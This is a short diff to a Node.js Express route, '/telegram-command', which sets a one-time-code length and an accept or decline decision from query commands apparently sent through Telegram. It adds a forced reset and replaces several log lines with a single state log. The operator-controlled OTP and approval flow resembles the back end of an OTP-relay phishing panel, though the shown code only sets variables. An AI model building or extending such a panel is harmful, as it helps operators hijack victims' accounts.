@@ -85,34 +85,35 @@ console.log("SENDING MESSAGE:", message);
 app.get("/telegram-command", (req, res) => {
   const cmd = req.query.cmd;
 
+  // 🔥 FORCE RESET FIRST
+  otpLength = null;
+
   if (cmd === "otp5") {
     otpLength = 5;
-    console.log("✅ OTP set to 5 from Telegram");
   }
 
   if (cmd === "otp6") {
     otpLength = 6;
-    console.log("✅ OTP set to 6 from Telegram");
   }
 
   if (cmd === "accept") {
     decision = "accept";
-    console.log("✅ USER ACCEPTED");
   }
 
   if (cmd === "decline") {
     decision = "decline";
-    console.log("❌ USER DECLINED");
   }
 
   if (cmd === "reset") {
     otpLength = null;
     decision = null;
-    console.log("🔄 Reset all");
   }
+
+  console.log("NEW STATE:", { otpLength, decision });
 
   res.send("OK");
 });
+
 // ==============================
 // ROOT ROUTE
 // ==============================
